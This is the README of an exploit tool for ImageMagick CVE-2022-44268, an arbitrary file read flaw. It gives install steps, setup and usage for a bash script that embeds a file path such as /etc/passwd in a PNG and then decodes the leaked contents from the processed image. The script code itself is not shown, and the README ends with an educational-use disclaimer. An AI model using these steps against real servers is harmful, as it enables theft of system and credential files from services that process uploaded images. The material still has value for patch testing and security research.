# Exploit-for-ImageMagick-CVE-2022-44268
A bash script for easly exploiting ImageMagick Arbitrary File Read Vulnerability CVE-2022-44268

## Image Magic version effected

```shell
Version: ImageMagick 6.9.11-60 Q16 x86_64 2021-01-25 https://imagemagick.org
Copyright: (C) 1999-2021 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC Modules OpenMP(4.5)
Delegates (built-in): bzlib djvu fftw fontconfig freetype heic jbig jng jp2 jpeg lcms lqr ltdl lzma openexr pangocairo png tiff webp wmf x xml zlib
```

## Packages need to Install

```shell
sudo apt-get install imagemagick exiftool pngcrush exiv2 -y
```

## Setup

```shell
git clone https://github.com/atici/Exploit-for-ImageMagick-CVE-2022-44268.git
cd Exploit-for-ImageMagick-CVE-2022-44268
chmod 750 script.sh
```
## Usage

```shell
./script.sh -p [Path to Read] [PNG Image] [Output[Optional, if not used defaults to pngout.png]]
./script.sh -d [PNG]

Examples
./script.sh -p /etc/passwd sample.png output.png
./script.sh -d pngout.png

Options
-h = Show help
-p = Add the exploit to a PNG image 
-d = Extract and decode the read file
```

## Credits

- Original Report: https://www.metabaseq.com/imagemagick-zero-days/
- Original Poc : https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC.git
- Inspiration for the project : https://github.com/Ashifcoder/CVE-2022-44268-automated-poc

# Disclaimer:

All the code provided on this repository is for educational/research purposes only. Any actions and/or activities related to the material contained within this repository is solely your responsibility. The misuse of the code in this repository can result in criminal charges brought against the persons in question. Author will not be held responsible in the event any criminal charges be brought against any individuals misusing the code in this repository to break the law.
